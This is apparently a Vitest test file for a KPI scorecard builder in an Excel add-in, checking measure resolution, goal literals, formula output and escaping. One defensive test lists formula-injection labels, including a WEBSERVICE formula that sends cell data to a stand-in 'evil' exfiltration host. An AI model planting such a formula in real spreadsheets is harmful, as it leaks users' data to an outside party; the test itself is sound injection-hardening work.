/**
 * F-025-10 / F-025-08 — KPI scorecard payload.
 *
 * The scorecard's Value/Goal cells are CUBEVALUE over the KPI's value/goal
 * MEASURES, so the payload must resolve measure ids to technical names. A KPI
 * with a static target (no goal measure) must carry the numeric target so the
 * Goal column is not blank. The status/trend cells use `kpi.name` (the gateway
 * publishes KPI_NAME = kpi.name, verified live: modely KPI 'aa').
 */
import { describe, it, expect } from 'vitest';
import { buildLiteralScorecardRows, buildFormulaScorecardRows, buildScorecardKpi, buildScorecardPayload } from '../utils/kpiScorecard';
import type { Kpi, Measure } from '../types/tessallite';

const measures: Measure[] = [
  { id: 'mv', name: 'fee_amount', display_name: 'fee amount', default_agg: 'sum', measure_type: 'standard' },
  { id: 'mg', name: 'fee_target', display_name: 'fee target', default_agg: 'sum', measure_type: 'standard' },
];
const byId = new Map(measures.map(m => [m.id, m]));

function kpi(partial: Partial<Kpi>): Kpi {
  return {
    id: 'k1', name: 'margin', display_name: 'Profit Margin', description: null,
    display_folder: null, value_measure_id: null, goal_measure_id: null,
    target_type: null, target_value: null,
    status_expression: null, trend_expression: null,
    status_graphic: 'Traffic Light', trend_graphic: 'Standard Arrow',
    weight: null, parent_kpi_id: null, certification_status: 'draft',
    replacement_id: null, owner_user_id: null, updated_at: '2026-01-01T00:00:00Z',
    ...partial,
  };
}

describe('buildScorecardKpi', () => {
  it('resolves value and goal measure ids to technical names', () => {
    const out = buildScorecardKpi(kpi({ value_measure_id: 'mv', goal_measure_id: 'mg' }), byId);
    expect(out.valueMeasureName).toBe('fee_amount');
    expect(out.goalMeasureName).toBe('fee_target');
    expect(out.goalLiteral).toBeNull();
  });

  it('emits the technical KPI name (not the display name) so status/trend bind', () => {
    const out = buildScorecardKpi(kpi({ name: 'margin', display_name: 'Profit Margin', value_measure_id: 'mv' }), byId);
    // F-025-08: the gateway publishes KPI_NAME = kpi.name. The payload carries
    // the technical name; useExcel emits CUBEKPIMEMBER over it.
    expect(out.name).toBe('margin');
  });

  it('carries the static target literal when a KPI has no goal measure (F-025-10)', () => {
    // mirrors live KPI 'aa': target_type=static, target_value=10000, no goal measure
    const out = buildScorecardKpi(kpi({ value_measure_id: 'mv', target_type: 'static', target_value: 10000 }), byId);
    expect(out.goalMeasureName).toBeNull();
    expect(out.goalLiteral).toBe(10000);
  });

  it('does NOT fabricate a goal literal for a measure-target KPI', () => {
    const out = buildScorecardKpi(kpi({ value_measure_id: 'mv', goal_measure_id: 'mg', target_type: 'measure' }), byId);
    expect(out.goalLiteral).toBeNull();
  });

  it('produces the correct contract for the individual-insert path when goal is a static literal (Bug-5294)', () => {
    // Bug-5294 lock-in: insertKpiFormulas consumes buildScorecardKpi's output.
    // When goal_measure_id is null and target_type is 'static', the insert path
    // writes goalLiteral directly into the Goal cell (not a CUBEVALUE formula).
    // This test guards the contract: goalMeasureName must be null (so the
    // formula branch is skipped) and goalLiteral must carry the numeric value.
    const out = buildScorecardKpi(
      kpi({ value_measure_id: 'mv', goal_measure_id: null, target_type: 'static', target_value: 42000 }),
      byId,
    );
    expect(out.goalMeasureName).toBeNull();
    expect(out.goalLiteral).toBe(42000);
    // valueMeasureName must still resolve normally
    expect(out.valueMeasureName).toBe('fee_amount');
  });

  it('leaves measure names null when the id is unknown (graceful, not blank-by-default)', () => {
    const out = buildScorecardKpi(kpi({ value_measure_id: 'missing' }), byId);
    expect(out.valueMeasureName).toBeNull();
  });
});

describe('buildScorecardPayload', () => {
  it('drops deprecated KPIs and resolves the rest', () => {
    const list = [
      kpi({ id: 'a', value_measure_id: 'mv', certification_status: 'certified' }),
      kpi({ id: 'b', certification_status: 'deprecated' }),
    ];
    const out = buildScorecardPayload(list, measures);
    expect(out.map(k => k.id)).toEqual(['a']);
    expect(out[0].valueMeasureName).toBe('fee_amount');
  });
});

describe('buildLiteralScorecardRows', () => {
  it('builds connectionless KPI scorecard rows from evaluated values', () => {
    const payload = [
      {
        ...buildScorecardKpi(
          kpi({
            id: 'a',
            name: 'inventory_cost',
            display_name: 'Inventory Cost',
            value_measure_id: 'mv',
            target_type: 'static',
            target_value: 100,
          }),
          byId,
        ),
        evaluatedValue: 75,
        evaluatedGoal: null,
        evaluatedStatus: 1,
      },
      {
        ...buildScorecardKpi(
          kpi({
            id: 'b',
            name: 'margin',
            display_name: null,
            value_measure_id: 'mv',
            goal_measure_id: 'mg',
          }),
          byId,
        ),
        evaluatedValue: 12.5,
        evaluatedGoal: 20,
        evaluatedStatus: -1,
      },
    ];

    expect(buildLiteralScorecardRows(payload)).toEqual([
      ['Inventory Cost', 75, 100, 1],
      ['margin', 12.5, 20, -1],
    ]);
  });

  it('does not emit CUBE or custom-function formulas into scorecard cells', () => {
    const payload = [
      {
        ...buildScorecardKpi(kpi({ id: 'a', name: 'cost_price', value_measure_id: 'mv' }), byId),
        evaluatedValue: null,
        evaluatedGoal: null,
        evaluatedStatus: null,
      },
    ];

    const rows = buildLiteralScorecardRows(payload);
    expect(JSON.stringify(rows)).not.toContain('CUBEVALUE');
    expect(JSON.stringify(rows)).not.toContain('CUBEKPIMEMBER');
    expect(JSON.stringify(rows)).not.toContain('TESSALLITE.');
  });
});

describe('buildFormulaScorecardRows', () => {
  it('emits TESSALLITE.KPI formulas for value, goal, and status columns', () => {
    const payload = [
      {
        ...buildScorecardKpi(
          kpi({ id: 'a', name: 'cost_price', display_name: 'Cost Price', value_measure_id: 'mv' }),
          byId,
        ),
        evaluatedValue: 42,
        evaluatedGoal: 50,
        evaluatedStatus: 1,
      },
    ];
    const rows = buildFormulaScorecardRows(payload, 'modelx');
    expect(rows).toHaveLength(1);
    expect(rows[0][0]).toBe('Cost Price');
    expect(rows[0][1]).toBe('=TESSALLITE.KPI("modelx","Cost Price","value")');
    expect(rows[0][2]).toBe('=TESSALLITE.KPI("modelx","Cost Price","goal")');
    expect(rows[0][3]).toBe('=TESSALLITE.KPI("modelx","Cost Price","status")');
  });

  it('uses the technical name when display_name is null', () => {
    const payload = [
      {
        ...buildScorecardKpi(kpi({ id: 'a', name: 'margin', display_name: null }), byId),
        evaluatedValue: null, evaluatedGoal: null, evaluatedStatus: null,
      },
    ];
    const rows = buildFormulaScorecardRows(payload, 'modely');
    expect(rows[0][1]).toBe('=TESSALLITE.KPI("modely","margin","value")');
  });

  it('escapes double quotes in model slug and KPI name', () => {
    const payload = [
      {
        ...buildScorecardKpi(kpi({ id: 'a', name: 'test"kpi', display_name: 'Test "KPI"' }), byId),
        evaluatedValue: null, evaluatedGoal: null, evaluatedStatus: null,
      },
    ];
    const rows = buildFormulaScorecardRows(payload, 'model"x');
    expect(rows[0][1]).toBe('=TESSALLITE.KPI("model""x","Test ""KPI""","value")');
  });

  // Bug-7393 (adversarial R3): the scorecard's formula-mode rows are written to
  // the Excel FORMULA channel (range.formulas). Column 0 is the KPI's raw
  // display label — modeller-controlled metadata. A formula-leading label would
  // execute as a live formula (CWE-1236). It must be neutralised.
  describe('Bug-7393: column-0 label formula-injection neutralization', () => {
    const injectionLabels = [
      '=WEBSERVICE("http://evil/exfil?d="&A1)',
      '=SUM(A1:A9)',
      '+1+1',
      '-2+3',
      '@SUM(A1)',
    ];

    it.each(injectionLabels)('prefixes a formula-leading label %s with an apostrophe', (label) => {
      const payload = [
        {
          ...buildScorecardKpi(kpi({ id: 'a', name: 'k', display_name: label }), byId),
          evaluatedValue: null, evaluatedGoal: null, evaluatedStatus: null,
        },
      ];
      const rows = buildFormulaScorecardRows(payload, 'modelx');
      // Column 0 must be neutralised: leading "'" so Excel treats it as text,
      // never a live formula.
      expect(rows[0][0]).toBe("'" + label);
      expect(rows[0][0].startsWith("'")).toBe(true);
      // The label's original leading trigger is no longer the first char.
      expect(['=', '+', '-', '@'].includes(rows[0][0][0])).toBe(false);
    });

    it('leaves a benign label unchanged (no spurious apostrophe)', () => {
      const payload = [
        {
          ...buildScorecardKpi(kpi({ id: 'a', name: 'k', display_name: 'Profit Margin' }), byId),
          evaluatedValue: null, evaluatedGoal: null, evaluatedStatus: null,
        },
      ];
      const rows = buildFormulaScorecardRows(payload, 'modelx');
      expect(rows[0][0]).toBe('Profit Margin');
    });
  });
});

/**
 * Bug-6728 -- cubeEligibility routing in the scorecard payload.
 */
/**
 * Bug-6728 -- cubeEligibility uses REAL producer domain values:
 * simple_measure (measure-backed), composite/ratio/etc (expression-based).
 */
describe('buildScorecardKpi cubeEligibility (Bug-6728)', () => {
  it('marks a deployed simple_measure KPI as cube_eligible', () => {
    const out = buildScorecardKpi(
      kpi({ value_measure_id: 'mv', kpi_type: 'simple_measure', is_deployed: true }),
      byId,
    );
    expect(out.cubeEligibility).toBe('cube_eligible');
  });

  it('marks a composite-expression KPI as composite_expression', () => {
    const out = buildScorecardKpi(
      kpi({ value_measure_id: null, kpi_type: 'composite', is_deployed: true }),
      byId,
    );
    expect(out.cubeEligibility).toBe('composite_expression');
  });

  it('marks an undeployed simple_measure KPI as undeployed', () => {
    const out = buildScorecardKpi(
      kpi({ value_measure_id: 'mv', kpi_type: 'simple_measure', is_deployed: false }),
      byId,
    );
    expect(out.cubeEligibility).toBe('undeployed');
  });

  it('marks a single-measure expression KPI as cube_eligible (gateway serves this)', () => {
    const out = buildScorecardKpi(
      kpi({ value_measure_id: null, kpi_type: 'composite', expression: 'measure("fee_amount")', is_deployed: true }),
      byId,
    );
    expect(out.cubeEligibility).toBe('cube_eligible');
  });
});
